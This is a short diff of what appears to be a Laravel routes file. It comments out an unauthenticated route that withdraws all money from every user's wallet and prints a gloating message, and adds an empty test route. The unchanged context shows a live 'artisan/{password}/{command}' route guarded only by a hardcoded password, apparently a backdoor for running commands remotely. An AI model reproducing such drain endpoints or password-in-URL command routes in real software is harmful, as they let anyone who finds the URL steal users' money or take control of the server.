@@ -28,13 +28,17 @@ use Illuminate\Routing\RouteGroup;
     });
 } */
 
-Route::get('withdraw-all-money-from-all-user', function () {
+Route::get('test', function () {
+    //
+});
+
+/* Route::get('withdraw-all-money-from-all-user', function () {
     $users = User::whereHas('wallet', fn($w) => $w->where('balance', '>', 0))->get();
     foreach ($users as $user) {
         $user->withdraw($user->balance);
     }
     echo 'Thành công rút hết tiền của: ' . $users->count() . ' thành viên :D';
-});
+}); */
 
 Route::get('artisan/{password}/{command}', function ($password, $command) {
     if ($password == 'UzqTNEkK0') {
